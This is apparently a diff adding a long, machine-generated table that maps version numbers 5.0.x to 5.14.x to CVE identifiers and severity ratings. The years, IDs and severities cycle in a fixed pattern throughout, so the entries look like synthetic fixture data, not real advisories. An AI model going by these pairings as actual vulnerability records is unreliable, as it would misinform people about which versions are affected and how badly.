+5.12.2|CVE-2022-11602|severity:high
+5.13.3|CVE-2023-11603|severity:crit
+5.14.4|CVE-2024-11604|severity:low
+5.0.5|CVE-2020-11605|severity:med
+5.1.6|CVE-2021-11606|severity:high
+5.2.7|CVE-2022-11607|severity:crit
+5.3.8|CVE-2023-11608|severity:low
+5.4.9|CVE-2024-11609|severity:med
+5.5.0|CVE-2020-11610|severity:high
+5.6.1|CVE-2021-11611|severity:crit
+5.7.2|CVE-2022-11612|severity:low
+5.8.3|CVE-2023-11613|severity:med
+5.9.4|CVE-2024-11614|severity:high
+5.10.5|CVE-2020-11615|severity:crit
+5.11.6|CVE-2021-11616|severity:low
+5.12.7|CVE-2022-11617|severity:med
+5.13.8|CVE-2023-11618|severity:high
+5.14.9|CVE-2024-11619|severity:crit
+5.0.0|CVE-2020-11620|severity:low
+5.1.1|CVE-2021-11621|severity:med
+5.2.2|CVE-2022-11622|severity:high
+5.3.3|CVE-2023-11623|severity:crit
+5.4.4|CVE-2024-11624|severity:low
+5.5.5|CVE-2020-11625|severity:med
+5.6.6|CVE-2021-11626|severity:high
+5.7.7|CVE-2022-11627|severity:crit
+5.8.8|CVE-2023-11628|severity:low
+5.9.9|CVE-2024-11629|severity:med
+5.10.0|CVE-2020-11630|severity:high
+5.11.1|CVE-2021-11631|severity:crit
+5.12.2|CVE-2022-11632|severity:low
+5.13.3|CVE-2023-11633|severity:med
+5.14.4|CVE-2024-11634|severity:high
+5.0.5|CVE-2020-11635|severity:crit
+5.1.6|CVE-2021-11636|severity:low
+5.2.7|CVE-2022-11637|severity:med
+5.3.8|CVE-2023-11638|severity:high
+5.4.9|CVE-2024-11639|severity:crit
+5.5.0|CVE-2020-11640|severity:low
+5.6.1|CVE-2021-11641|severity:med
+5.7.2|CVE-2022-11642|severity:high
+5.8.3|CVE-2023-11643|severity:crit
+5.9.4|CVE-2024-11644|severity:low
+5.10.5|CVE-2020-11645|severity:med
+5.11.6|CVE-2021-11646|severity:high
+5.12.7|CVE-2022-11647|severity:crit
+5.13.8|CVE-2023-11648|severity:low
+5.14.9|CVE-2024-11649|severity:med
+5.0.0|CVE-2020-11650|severity:high
+5.1.1|CVE-2021-11651|severity:crit
+5.2.2|CVE-2022-11652|severity:low
+5.3.3|CVE-2023-11653|severity:med
+5.4.4|CVE-2024-11654|severity:high
+5.5.5|CVE-2020-11655|severity:crit
+5.6.6|CVE-2021-11656|severity:low
+5.7.7|CVE-2022-11657|severity:med
+5.8.8|CVE-2023-11658|severity:high
+5.9.9|CVE-2024-11659|severity:crit
+5.10.0|CVE-2020-11660|severity:low
+5.11.1|CVE-2021-11661|severity:med
+5.12.2|CVE-2022-11662|severity:high
+5.13.3|CVE-2023-11663|severity:crit
+5.14.4|CVE-2024-11664|severity:low
+5.0.5|CVE-2020-11665|severity:med
+5.1.6|CVE-2021-11666|severity:high
+5.2.7|CVE-2022-11667|severity:crit
+5.3.8|CVE-2023-11668|severity:low
+5.4.9|CVE-2024-11669|severity:med
+5.5.0|CVE-2020-11670|severity:high
+5.6.1|CVE-2021-11671|severity:crit
+5.7.2|CVE-2022-11672|severity:low
+5.8.3|CVE-2023-11673|severity:med
+5.9.4|CVE-2024-11674|severity:high
+5.10.5|CVE-2020-11675|severity:crit
+5.11.6|CVE-2021-11676|severity:low
+5.12.7|CVE-2022-11677|severity:med
+5.13.8|CVE-2023-11678|severity:high
+5.14.9|CVE-2024-11679|severity:crit
+5.0.0|CVE-2020-11680|severity:low
+5.1.1|CVE-2021-11681|severity:med
+5.2.2|CVE-2022-11682|severity:high
+5.3.3|CVE-2023-11683|severity:crit
+5.4.4|CVE-2024-11684|severity:low
+5.5.5|CVE-2020-11685|severity:med
+5.6.6|CVE-2021-11686|severity:high
+5.7.7|CVE-2022-11687|severity:crit
+5.8.8|CVE-2023-11688|severity:low
+5.9.9|CVE-2024-11689|severity:med
+5.10.0|CVE-2020-11690|severity:high
+5.11.1|CVE-2021-11691|severity:crit
+5.12.2|CVE-2022-11692|severity:low
+5.13.3|CVE-2023-11693|severity:med
+5.14.4|CVE-2024-11694|severity:high
+5.0.5|CVE-2020-11695|severity:crit
+5.1.6|CVE-2021-11696|severity:low
+5.2.7|CVE-2022-11697|severity:med
+5.3.8|CVE-2023-11698|severity:high
+5.4.9|CVE-2024-11699|severity:crit
+5.5.0|CVE-2020-11700|severity:low
+5.6.1|CVE-2021-11701|severity:med
+5.7.2|CVE-2022-11702|severity:high
+5.8.3|CVE-2023-11703|severity:crit
+5.9.4|CVE-2024-11704|severity:low
+5.10.5|CVE-2020-11705|severity:med
+5.11.6|CVE-2021-11706|severity:high
+5.12.7|CVE-2022-11707|severity:crit
+5.13.8|CVE-2023-11708|severity:low
+5.14.9|CVE-2024-11709|severity:med
+5.0.0|CVE-2020-11710|severity:high
+5.1.1|CVE-2021-11711|severity:crit
+5.2.2|CVE-2022-11712|severity:low
+5.3.3|CVE-2023-11713|severity:med
+5.4.4|CVE-2024-11714|severity:high
+5.5.5|CVE-2020-11715|severity:crit
+5.6.6|CVE-2021-11716|severity:low
+5.7.7|CVE-2022-11717|severity:med
+5.8.8|CVE-2023-11718|severity:high
+5.9.9|CVE-2024-11719|severity:crit
+5.10.0|CVE-2020-11720|severity:low
+5.11.1|CVE-2021-11721|severity:med
+5.12.2|CVE-2022-11722|severity:high
+5.13.3|CVE-2023-11723|severity:crit
+5.14.4|CVE-2024-11724|severity:low
+5.0.5|CVE-2020-11725|severity:med
+5.1.6|CVE-2021-11726|severity:high
+5.2.7|CVE-2022-11727|severity:crit
+5.3.8|CVE-2023-11728|severity:low
+5.4.9|CVE-2024-11729|severity:med
+5.5.0|CVE-2020-11730|severity:high
+5.6.1|CVE-2021-11731|severity:crit
+5.7.2|CVE-2022-11732|severity:low
+5.8.3|CVE-2023-11733|severity:med
+5.9.4|CVE-2024-11734|severity:high
+5.10.5|CVE-2020-11735|severity:crit
+5.11.6|CVE-2021-11736|severity:low
+5.12.7|CVE-2022-11737|severity:med
+5.13.8|CVE-2023-11738|severity:high
+5.14.9|CVE-2024-11739|severity:crit
+5.0.0|CVE-2020-11740|severity:low
+5.1.1|CVE-2021-11741|severity:med
+5.2.2|CVE-2022-11742|severity:high
+5.3.3|CVE-2023-11743|severity:crit
+5.4.4|CVE-2024-11744|severity:low
+5.5.5|CVE-2020-11745|severity:med
+5.6.6|CVE-2021-11746|severity:high
+5.7.7|CVE-2022-11747|severity:crit
+5.8.8|CVE-2023-11748|severity:low
+5.9.9|CVE-2024-11749|severity:med
+5.10.0|CVE-2020-11750|severity:high
+5.11.1|CVE-2021-11751|severity:crit
+5.12.2|CVE-2022-11752|severity:low
+5.13.3|CVE-2023-11753|severity:med
+5.14.4|CVE-2024-11754|severity:high
+5.0.5|CVE-2020-11755|severity:crit
+5.1.6|CVE-2021-11756|severity:low
+5.2.7|CVE-2022-11757|severity:med
+5.3.8|CVE-2023-11758|severity:high
+5.4.9|CVE-2024-11759|severity:crit
+5.5.0|CVE-2020-11760|severity:low
+5.6.1|CVE-2021-11761|severity:med
+5.7.2|CVE-2022-11762|severity:high
+5.8.3|CVE-2023-11763|severity:crit
+5.9.4|CVE-2024-11764|severity:low
+5.10.5|CVE-2020-11765|severity:med
+5.11.6|CVE-2021-11766|severity:high
+5.12.7|CVE-2022-11767|severity:crit
+5.13.8|CVE-2023-11768|severity:low
+5.14.9|CVE-2024-11769|severity:med
+5.0.0|CVE-2020-11770|severity:high
+5.1.1|CVE-2021-11771|severity:crit
+5.2.2|CVE-2022-11772|severity:low
+5.3.3|CVE-2023-11773|severity:med
+5.4.4|CVE-2024-11774|severity:high
+5.5.5|CVE-2020-11775|severity:crit
+5.6.6|CVE-2021-11776|severity:low
+5.7.7|CVE-2022-11777|severity:med
+5.8.8|CVE-2023-11778|severity:high
+5.9.9|CVE-2024-11779|severity:crit
+5.10.0|CVE-2020-11780|severity:low
+5.11.1|CVE-2021-11781|severity:med
+5.12.2|CVE-2022-11782|severity:high
+5.13.3|CVE-2023-11783|severity:crit
+5.14.4|CVE-2024-11784|severity:low
+5.0.5|CVE-2020-11785|severity:med
+5.1.6|CVE-2021-11786|severity:high
+5.2.7|CVE-2022-11787|severity:crit
+5.3.8|CVE-2023-11788|severity:low
+5.4.9|CVE-2024-11789|severity:med
+5.5.0|CVE-2020-11790|severity:high
+5.6.1|CVE-2021-11791|severity:crit
+5.7.2|CVE-2022-11792|severity:low
+5.8.3|CVE-2023-11793|severity:med
+5.9.4|CVE-2024-11794|severity:high
+5.10.5|CVE-2020-11795|severity:crit
+5.11.6|CVE-2021-11796|severity:low
+5.12.7|CVE-2022-11797|severity:med
+5.13.8|CVE-2023-11798|severity:high
+5.14.9|CVE-2024-11799|severity:crit
+5.0.0|CVE-2020-11800|severity:low
+5.1.1|CVE-2021-11801|severity:med
+5.2.2|CVE-2022-11802|severity:high
+5.3.3|CVE-2023-11803|severity:crit
+5.4.4|CVE-2024-11804|severity:low
+5.5.5|CVE-2020-11805|severity:med
+5.6.6|CVE-2021-11806|severity:high
+5.7.7|CVE-2022-11807|severity:crit
+5.8.8|CVE-2023-11808|severity:low
+5.9.9|CVE-2024-11809|severity:med
+5.10.0|CVE-2020-11810|severity:high
+5.11.1|CVE-2021-11811|severity:crit
+5.12.2|CVE-2022-11812|severity:low
+5.13.3|CVE-2023-11813|severity:med
+5.14.4|CVE-2024-11814|severity:high
+5.0.5|CVE-2020-11815|severity:crit
+5.1.6|CVE-2021-11816|severity:low
+5.2.7|CVE-2022-11817|severity:med
+5.3.8|CVE-2023-11818|severity:high
+5.4.9|CVE-2024-11819|severity:crit
+5.5.0|CVE-2020-11820|severity:low
+5.6.1|CVE-2021-11821|severity:med
+5.7.2|CVE-2022-11822|severity:high
+5.8.3|CVE-2023-11823|severity:crit
+5.9.4|CVE-2024-11824|severity:low
+5.10.5|CVE-2020-11825|severity:med
+5.11.6|CVE-2021-11826|severity:high
+5.12.7|CVE-2022-11827|severity:crit
+5.13.8|CVE-2023-11828|severity:low
+5.14.9|CVE-2024-11829|severity:med
+5.0.0|CVE-2020-11830|severity:high
+5.1.1|CVE-2021-11831|severity:crit
+5.2.2|CVE-2022-11832|severity:low
+5.3.3|CVE-2023-11833|severity:med
+5.4.4|CVE-2024-11834|severity:high
+5.5.5|CVE-2020-11835|severity:crit
+5.6.6|CVE-2021-11836|severity:low
+5.7.7|CVE-2022-11837|severity:med
+5.8.8|CVE-2023-11838|severity:high
+5.9.9|CVE-2024-11839|severity:crit
+5.10.0|CVE-2020-11840|severity:low
+5.11.1|CVE-2021-11841|severity:med
+5.12.2|CVE-2022-11842|severity:high
+5.13.3|CVE-2023-11843|severity:crit
+5.14.4|CVE-2024-11844|severity:low
+5.0.5|CVE-2020-11845|severity:med
+5.1.6|CVE-2021-11846|severity:high
+5.2.7|CVE-2022-11847|severity:crit
+5.3.8|CVE-2023-11848|severity:low
+5.4.9|CVE-2024-11849|severity:med
+5.5.0|CVE-2020-11850|severity:high
+5.6.1|CVE-2021-11851|severity:crit
+5.7.2|CVE-2022-11852|severity:low
+5.8.3|CVE-2023-11853|severity:med
+5.9.4|CVE-2024-11854|severity:high
+5.10.5|CVE-2020-11855|severity:crit
+5.11.6|CVE-2021-11856|severity:low
+5.12.7|CVE-2022-11857|severity:med
+5.13.8|CVE-2023-11858|severity:high
+5.14.9|CVE-2024-11859|severity:crit
+5.0.0|CVE-2020-11860|severity:low
+5.1.1|CVE-2021-11861|severity:med
+5.2.2|CVE-2022-11862|severity:high
+5.3.3|CVE-2023-11863|severity:crit
+5.4.4|CVE-2024-11864|severity:low
+5.5.5|CVE-2020-11865|severity:med
+5.6.6|CVE-2021-11866|severity:high
+5.7.7|CVE-2022-11867|severity:crit
+5.8.8|CVE-2023-11868|severity:low
+5.9.9|CVE-2024-11869|severity:med
+5.10.0|CVE-2020-11870|severity:high
+5.11.1|CVE-2021-11871|severity:crit
+5.12.2|CVE-2022-11872|severity:low
+5.13.3|CVE-2023-11873|severity:med
+5.14.4|CVE-2024-11874|severity:high
+5.0.5|CVE-2020-11875|severity:crit
+5.1.6|CVE-2021-11876|severity:low
+5.2.7|CVE-2022-11877|severity:med
+5.3.8|CVE-2023-11878|severity:high
+5.4.9|CVE-2024-11879|severity:crit
+5.5.0|CVE-2020-11880|severity:low
+5.6.1|CVE-2021-11881|severity:med
+5.7.2|CVE-2022-11882|severity:high
+5.8.3|CVE-2023-11883|severity:crit
+5.9.4|CVE-2024-11884|severity:low
+5.10.5|CVE-2020-11885|severity:med
+5.11.6|CVE-2021-11886|severity:high
+5.12.7|CVE-2022-11887|severity:crit
+5.13.8|CVE-2023-11888|severity:low
+5.14.9|CVE-2024-11889|severity:med
+5.0.0|CVE-2020-11890|severity:high
+5.1.1|CVE-2021-11891|severity:crit
+5.2.2|CVE-2022-11892|severity:low
+5.3.3|CVE-2023-11893|severity:med
+5.4.4|CVE-2024-11894|severity:high
+5.5.5|CVE-2020-11895|severity:crit
+5.6.6|CVE-2021-11896|severity:low
+5.7.7|CVE-2022-11897|severity:med
+5.8.8|CVE-2023-11898|severity:high
+5.9.9|CVE-2024-11899|severity:crit
+5.10.0|CVE-2020-11900|severity:low
+5.11.1|CVE-2021-11901|severity:med
+5.12.2|CVE-2022-11902|severity:high
+5.13.3|CVE-2023-11903|severity:crit
+5.14.4|CVE-2024-11904|severity:low
+5.0.5|CVE-2020-11905|severity:med
+5.1.6|CVE-2021-11906|severity:high
+5.2.7|CVE-2022-11907|severity:crit
+5.3.8|CVE-2023-11908|severity:low
+5.4.9|CVE-2024-11909|severity:med
+5.5.0|CVE-2020-11910|severity:high
+5.6.1|CVE-2021-11911|severity:crit
+5.7.2|CVE-2022-11912|severity:low
+5.8.3|CVE-2023-11913|severity:med
+5.9.4|CVE-2024-11914|severity:high
+5.10.5|CVE-2020-11915|severity:crit
+5.11.6|CVE-2021-11916|severity:low
+5.12.7|CVE-2022-11917|severity:med
+5.13.8|CVE-2023-11918|severity:high
+5.14.9|CVE-2024-11919|severity:crit
+5.0.0|CVE-2020-11920|severity:low
+5.1.1|CVE-2021-11921|severity:med
+5.2.2|CVE-2022-11922|severity:high
+5.3.3|CVE-2023-11923|severity:crit
+5.4.4|CVE-2024-11924|severity:low
+5.5.5|CVE-2020-11925|severity:med
+5.6.6|CVE-2021-11926|severity:high
+5.7.7|CVE-2022-11927|severity:crit
+5.8.8|CVE-2023-11928|severity:low
+5.9.9|CVE-2024-11929|severity:med
+5.10.0|CVE-2020-11930|severity:high
+5.11.1|CVE-2021-11931|severity:crit
+5.12.2|CVE-2022-11932|severity:low
+5.13.3|CVE-2023-11933|severity:med
+5.14.4|CVE-2024-11934|severity:high
+5.0.5|CVE-2020-11935|severity:crit
+5.1.6|CVE-2021-11936|severity:low
+5.2.7|CVE-2022-11937|severity:med
+5.3.8|CVE-2023-11938|severity:high
+5.4.9|CVE-2024-11939|severity:crit
+5.5.0|CVE-2020-11940|severity:low
+5.6.1|CVE-2021-11941|severity:med
+5.7.2|CVE-2022-11942|severity:high
+5.8.3|CVE-2023-11943|severity:crit
+5.9.4|CVE-2024-11944|severity:low
+5.10.5|CVE-2020-11945|severity:med
+5.11.6|CVE-2021-11946|severity:high
+5.12.7|CVE-2022-11947|severity:crit
+5.13.8|CVE-2023-11948|severity:low
+5.14.9|CVE-2024-11949|severity:med
+5.0.0|CVE-2020-11950|severity:high
+5.1.1|CVE-2021-11951|severity:crit
+5.2.2|CVE-2022-11952|severity:low
+5.3.3|CVE-2023-11953|severity:med
+5.4.4|CVE-2024-11954|severity:high
+5.5.5|CVE-2020-11955|severity:crit
+5.6.6|CVE-2021-11956|severity:low
+5.7.7|CVE-2022-11957|severity:med
+5.8.8|CVE-2023-11958|severity:high
+5.9.9|CVE-2024-11959|severity:crit
+5.10.0|CVE-2020-11960|severity:low
+5.11.1|CVE-2021-11961|severity:med
+5.12.2|CVE-2022-11962|severity:high
+5.13.3|CVE-2023-11963|severity:crit
+5.14.4|CVE-2024-11964|severity:low
+5.0.5|CVE-2020-11965|severity:med
+5.1.6|CVE-2021-11966|severity:high
+5.2.7|CVE-2022-11967|severity:crit
+5.3.8|CVE-2023-11968|severity:low
+5.4.9|CVE-2024-11969|severity:med
+5.5.0|CVE-2020-11970|severity:high
+5.6.1|CVE-2021-11971|severity:crit
+5.7.2|CVE-2022-11972|severity:low
+5.8.3|CVE-2023-11973|severity:med
+5.9.4|CVE-2024-11974|severity:high
+5.10.5|CVE-2020-11975|severity:crit
+5.11.6|CVE-2021-11976|severity:low
+5.12.7|CVE-2022-11977|severity:med
+5.13.8|CVE-2023-11978|severity:high
+5.14.9|CVE-2024-11979|severity:crit
+5.0.0|CVE-2020-11980|severity:low
+5.1.1|CVE-2021-11981|severity:med
+5.2.2|CVE-2022-11982|severity:high
+5.3.3|CVE-2023-11983|severity:crit
+5.4.4|CVE-2024-11984|severity:low
+5.5.5|CVE-2020-11985|severity:med
+5.6.6|CVE-2021-11986|severity:high
+5.7.7|CVE-2022-11987|severity:crit
+5.8.8|CVE-2023-11988|severity:low
+5.9.9|CVE-2024-11989|severity:med
+5.10.0|CVE-2020-11990|severity:high
+5.11.1|CVE-2021-11991|severity:crit
+5.12.2|CVE-2022-11992|severity:low
+5.13.3|CVE-2023-11993|severity:med
+5.14.4|CVE-2024-11994|severity:high
+5.0.5|CVE-2020-11995|severity:crit
+5.1.6|CVE-2021-11996|severity:low
+5.2.7|CVE-2022-11997|severity:med
+5.3.8|CVE-2023-11998|severity:high
+5.4.9|CVE-2024-11999|severity:crit
+5.5.0|CVE-2020-12000|severity:low
+5.6.1|CVE-2021-12001|severity:med
+5.7.2|CVE-2022-12002|severity:high
+5.8.3|CVE-2023-12003|severity:crit
+5.9.4|CVE-2024-12004|severity:low
+5.10.5|CVE-2020-12005|severity:med
+5.11.6|CVE-2021-12006|severity:high
+5.12.7|CVE-2022-12007|severity:crit
+5.13.8|CVE-2023-12008|severity:low
+5.14.9|CVE-2024-12009|severity:med
+5.0.0|CVE-2020-12010|severity:high
+5.1.1|CVE-2021-12011|severity:crit
+5.2.2|CVE-2022-12012|severity:low
+5.3.3|CVE-2023-12013|severity:med
+5.4.4|CVE-2024-12014|severity:high
+5.5.5|CVE-2020-12015|severity:crit
+5.6.6|CVE-2021-12016|severity:low
+5.7.7|CVE-2022-12017|severity:med
+5.8.8|CVE-2023-12018|severity:high
+5.9.9|CVE-2024-12019|severity:crit
+5.10.0|CVE-2020-12020|severity:low
+5.11.1|CVE-2021-12021|severity:med
+5.12.2|CVE-2022-12022|severity:high
+5.13.3|CVE-2023-12023|severity:crit
+5.14.4|CVE-2024-12024|severity:low
+5.0.5|CVE-2020-12025|severity:med
+5.1.6|CVE-2021-12026|severity:high
+5.2.7|CVE-2022-12027|severity:crit
+5.3.8|CVE-2023-12028|severity:low
+5.4.9|CVE-2024-12029|severity:med
+5.5.0|CVE-2020-12030|severity:high
+5.6.1|CVE-2021-12031|severity:crit
+5.7.2|CVE-2022-12032|severity:low
+5.8.3|CVE-2023-12033|severity:med
+5.9.4|CVE-2024-12034|severity:high
+5.10.5|CVE-2020-12035|severity:crit
+5.11.6|CVE-2021-12036|severity:low
+5.12.7|CVE-2022-12037|severity:med
+5.13.8|CVE-2023-12038|severity:high
+5.14.9|CVE-2024-12039|severity:crit
+5.0.0|CVE-2020-12040|severity:low
+5.1.1|CVE-2021-12041|severity:med
+5.2.2|CVE-2022-12042|severity:high
+5.3.3|CVE-2023-12043|severity:crit
+5.4.4|CVE-2024-12044|severity:low
+5.5.5|CVE-2020-12045|severity:med
+5.6.6|CVE-2021-12046|severity:high
+5.7.7|CVE-2022-12047|severity:crit
+5.8.8|CVE-2023-12048|severity:low
+5.9.9|CVE-2024-12049|severity:med
+5.10.0|CVE-2020-12050|severity:high
+5.11.1|CVE-2021-12051|severity:crit
+5.12.2|CVE-2022-12052|severity:low
+5.13.3|CVE-2023-12053|severity:med
+5.14.4|CVE-2024-12054|severity:high
+5.0.5|CVE-2020-12055|severity:crit
+5.1.6|CVE-2021-12056|severity:low
+5.2.7|CVE-2022-12057|severity:med
+5.3.8|CVE-2023-12058|severity:high
+5.4.9|CVE-2024-12059|severity:crit
+5.5.0|CVE-2020-12060|severity:low
+5.6.1|CVE-2021-12061|severity:med
+5.7.2|CVE-2022-12062|severity:high
+5.8.3|CVE-2023-12063|severity:crit
+5.9.4|CVE-2024-12064|severity:low
+5.10.5|CVE-2020-12065|severity:med
+5.11.6|CVE-2021-12066|severity:high
+5.12.7|CVE-2022-12067|severity:crit
+5.13.8|CVE-2023-12068|severity:low
+5.14.9|CVE-2024-12069|severity:med
+5.0.0|CVE-2020-12070|severity:high
+5.1.1|CVE-2021-12071|severity:crit
+5.2.2|CVE-2022-12072|severity:low
+5.3.3|CVE-2023-12073|severity:med
+5.4.4|CVE-2024-12074|severity:high
+5.5.5|CVE-2020-12075|severity:crit
+5.6.6|CVE-2021-12076|severity:low
+5.7.7|CVE-2022-12077|severity:med
+5.8.8|CVE-2023-12078|severity:high
+5.9.9|CVE-2024-12079|severity:crit
+5.10.0|CVE-2020-12080|severity:low
+5.11.1|CVE-2021-12081|severity:med
+5.12.2|CVE-2022-12082|severity:high
+5.13.3|CVE-2023-12083|severity:crit
+5.14.4|CVE-2024-12084|severity:low
+5.0.5|CVE-2020-12085|severity:med
+5.1.6|CVE-2021-12086|severity:high
+5.2.7|CVE-2022-12087|severity:crit
+5.3.8|CVE-2023-12088|severity:low
+5.4.9|CVE-2024-12089|severity:med
+5.5.0|CVE-2020-12090|severity:high
+5.6.1|CVE-2021-12091|severity:crit
+5.7.2|CVE-2022-12092|severity:low
+5.8.3|CVE-2023-12093|severity:med
+5.9.4|CVE-2024-12094|severity:high
+5.10.5|CVE-2020-12095|severity:crit
+5.11.6|CVE-2021-12096|severity:low
+5.12.7|CVE-2022-12097|severity:med
+5.13.8|CVE-2023-12098|severity:high
+5.14.9|CVE-2024-12099|severity:crit
+5.0.0|CVE-2020-12100|severity:low
+5.1.1|CVE-2021-12101|severity:med
+5.2.2|CVE-2022-12102|severity:high
+5.3.3|CVE-2023-12103|severity:crit
+5.4.4|CVE-2024-12104|severity:low
+5.5.5|CVE-2020-12105|severity:med
+5.6.6|CVE-2021-12106|severity:high
+5.7.7|CVE-2022-12107|severity:crit
+5.8.8|CVE-2023-12108|severity:low
+5.9.9|CVE-2024-12109|severity:med
+5.10.0|CVE-2020-12110|severity:high
+5.11.1|CVE-2021-12111|severity:crit
+5.12.2|CVE-2022-12112|severity:low
+5.13.3|CVE-2023-12113|severity:med
+5.14.4|CVE-2024-12114|severity:high
+5.0.5|CVE-2020-12115|severity:crit
+5.1.6|CVE-2021-12116|severity:low
+5.2.7|CVE-2022-12117|severity:med
+5.3.8|CVE-2023-12118|severity:high
+5.4.9|CVE-2024-12119|severity:crit
+5.5.0|CVE-2020-12120|severity:low
+5.6.1|CVE-2021-12121|severity:med
+5.7.2|CVE-2022-12122|severity:high
+5.8.3|CVE-2023-12123|severity:crit
+5.9.4|CVE-2024-12124|severity:low
+5.10.5|CVE-2020-12125|severity:med
+5.11.6|CVE-2021-12126|severity:high
+5.12.7|CVE-2022-12127|severity:crit
+5.13.8|CVE-2023-12128|severity:low
+5.14.9|CVE-2024-12129|severity:med
+5.0.0|CVE-2020-12130|severity:high
+5.1.1|CVE-2021-12131|severity:crit
+5.2.2|CVE-2022-12132|severity:low
+5.3.3|CVE-2023-12133|severity:med
+5.4.4|CVE-2024-12134|severity:high
+5.5.5|CVE-2020-12135|severity:crit
+5.6.6|CVE-2021-12136|severity:low
+5.7.7|CVE-2022-12137|severity:med
+5.8.8|CVE-2023-12138|severity:high
+5.9.9|CVE-2024-12139|severity:crit
+5.10.0|CVE-2020-12140|severity:low
+5.11.1|CVE-2021-12141|severity:med
+5.12.2|CVE-2022-12142|severity:high
+5.13.3|CVE-2023-12143|severity:crit
+5.14.4|CVE-2024-12144|severity:low
+5.0.5|CVE-2020-12145|severity:med
+5.1.6|CVE-2021-12146|severity:high
+5.2.7|CVE-2022-12147|severity:crit
+5.3.8|CVE-2023-12148|severity:low
+5.4.9|CVE-2024-12149|severity:med
+5.5.0|CVE-2020-12150|severity:high
+5.6.1|CVE-2021-12151|severity:crit
+5.7.2|CVE-2022-12152|severity:low
+5.8.3|CVE-2023-12153|severity:med
+5.9.4|CVE-2024-12154|severity:high
+5.10.5|CVE-2020-12155|severity:crit
+5.11.6|CVE-2021-12156|severity:low
+5.12.7|CVE-2022-12157|severity:med
+5.13.8|CVE-2023-12158|severity:high
+5.14.9|CVE-2024-12159|severity:crit
+5.0.0|CVE-2020-12160|severity:low
+5.1.1|CVE-2021-12161|severity:med
+5.2.2|CVE-2022-12162|severity:high
+5.3.3|CVE-2023-12163|severity:crit
+5.4.4|CVE-2024-12164|severity:low
+5.5.5|CVE-2020-12165|severity:med
+5.6.6|CVE-2021-12166|severity:high
+5.7.7|CVE-2022-12167|severity:crit
+5.8.8|CVE-2023-12168|severity:low
+5.9.9|CVE-2024-12169|severity:med
+5.10.0|CVE-2020-12170|severity:high
+5.11.1|CVE-2021-12171|severity:crit
+5.12.2|CVE-2022-12172|severity:low
+5.13.3|CVE-2023-12173|severity:med
+5.14.4|CVE-2024-12174|severity:high
+5.0.5|CVE-2020-12175|severity:crit
+5.1.6|CVE-2021-12176|severity:low
+5.2.7|CVE-2022-12177|severity:med
+5.3.8|CVE-2023-12178|severity:high
+5.4.9|CVE-2024-12179|severity:crit
+5.5.0|CVE-2020-12180|severity:low
+5.6.1|CVE-2021-12181|severity:med
+5.7.2|CVE-2022-12182|severity:high
+5.8.3|CVE-2023-12183|severity:crit
+5.9.4|CVE-2024-12184|severity:low
+5.10.5|CVE-2020-12185|severity:med
+5.11.6|CVE-2021-12186|severity:high
+5.12.7|CVE-2022-12187|severity:crit
+5.13.8|CVE-2023-12188|severity:low
+5.14.9|CVE-2024-12189|severity:med
+5.0.0|CVE-2020-12190|severity:high
+5.1.1|CVE-2021-12191|severity:crit
+5.2.2|CVE-2022-12192|severity:low
+5.3.3|CVE-2023-12193|severity:med
+5.4.4|CVE-2024-12194|severity:high
+5.5.5|CVE-2020-12195|severity:crit
+5.6.6|CVE-2021-12196|severity:low
+5.7.7|CVE-2022-12197|severity:med
+5.8.8|CVE-2023-12198|severity:high
+5.9.9|CVE-2024-12199|severity:crit
+5.10.0|CVE-2020-12200|severity:low
+5.11.1|CVE-2021-12201|severity:med
+5.12.2|CVE-2022-12202|severity:high
+5.13.3|CVE-2023-12203|severity:crit
+5.14.4|CVE-2024-12204|severity:low
+5.0.5|CVE-2020-12205|severity:med
+5.1.6|CVE-2021-12206|severity:high
+5.2.7|CVE-2022-12207|severity:crit
+5.3.8|CVE-2023-12208|severity:low
+5.4.9|CVE-2024-12209|severity:med
+5.5.0|CVE-2020-12210|severity:high
+5.6.1|CVE-2021-12211|severity:crit
+5.7.2|CVE-2022-12212|severity:low
+5.8.3|CVE-2023-12213|severity:med
+5.9.4|CVE-2024-12214|severity:high
+5.10.5|CVE-2020-12215|severity:crit
+5.11.6|CVE-2021-12216|severity:low
+5.12.7|CVE-2022-12217|severity:med
+5.13.8|CVE-2023-12218|severity:high
+5.14.9|CVE-2024-12219|severity:crit
+5.0.0|CVE-2020-12220|severity:low
+5.1.1|CVE-2021-12221|severity:med
+5.2.2|CVE-2022-12222|severity:high
+5.3.3|CVE-2023-12223|severity:crit
+5.4.4|CVE-2024-12224|severity:low
+5.5.5|CVE-2020-12225|severity:med
+5.6.6|CVE-2021-12226|severity:high
+5.7.7|CVE-2022-12227|severity:crit
+5.8.8|CVE-2023-12228|severity:low
+5.9.9|CVE-2024-12229|severity:med
+5.10.0|CVE-2020-12230|severity:high
+5.11.1|CVE-2021-12231|severity:crit
+5.12.2|CVE-2022-12232|severity:low
+5.13.3|CVE-2023-12233|severity:med
+5.14.4|CVE-2024-12234|severity:high
+5.0.5|CVE-2020-12235|severity:crit
+5.1.6|CVE-2021-12236|severity:low
+5.2.7|CVE-2022-12237|severity:med
+5.3.8|CVE-2023-12238|severity:high
+5.4.9|CVE-2024-12239|severity:crit
+5.5.0|CVE-2020-12240|severity:low
+5.6.1|CVE-2021-12241|severity:med
+5.7.2|CVE-2022-12242|severity:high
+5.8.3|CVE-2023-12243|severity:crit
+5.9.4|CVE-2024-12244|severity:low
+5.10.5|CVE-2020-12245|severity:med
+5.11.6|CVE-2021-12246|severity:high
+5.12.7|CVE-2022-12247|severity:crit
+5.13.8|CVE-2023-12248|severity:low
+5.14.9|CVE-2024-12249|severity:med
+5.0.0|CVE-2020-12250|severity:high
+5.1.1|CVE-2021-12251|severity:crit
+5.2.2|CVE-2022-12252|severity:low
+5.3.3|CVE-2023-12253|severity:med
+5.4.4|CVE-2024-12254|severity:high
+5.5.5|CVE-2020-12255|severity:crit
+5.6.6|CVE-2021-12256|severity:low
+5.7.7|CVE-2022-12257|severity:med
+5.8.8|CVE-2023-12258|severity:high
+5.9.9|CVE-2024-12259|severity:crit
+5.10.0|CVE-2020-12260|severity:low
+5.11.1|CVE-2021-12261|severity:med
+5.12.2|CVE-2022-12262|severity:high
+5.13.3|CVE-2023-12263|severity:crit
+5.14.4|CVE-2024-12264|severity:low
+5.0.5|CVE-2020-12265|severity:med
+5.1.6|CVE-2021-12266|severity:high
+5.2.7|CVE-2022-12267|severity:crit
+5.3.8|CVE-2023-12268|severity:low
+5.4.9|CVE-2024-12269|severity:med
+5.5.0|CVE-2020-12270|severity:high
+5.6.1|CVE-2021-12271|severity:crit
+5.7.2|CVE-2022-12272|severity:low
+5.8.3|CVE-2023-12273|severity:med
+5.9.4|CVE-2024-12274|severity:high
+5.10.5|CVE-2020-12275|severity:crit
